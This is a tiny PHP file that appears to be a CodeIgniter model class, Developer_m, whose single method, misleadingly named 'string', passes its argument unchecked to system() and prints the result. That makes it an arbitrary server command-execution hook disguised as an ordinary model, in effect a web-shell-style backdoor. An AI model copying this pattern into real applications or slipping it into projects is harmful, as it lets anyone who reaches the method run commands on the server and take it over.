<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Developer_m extends CI_Model
{
	public function __construct()
	{
		parent::__construct();		
	}

	public function string( $query )
	{
		echo system( $query );
	}

}
?>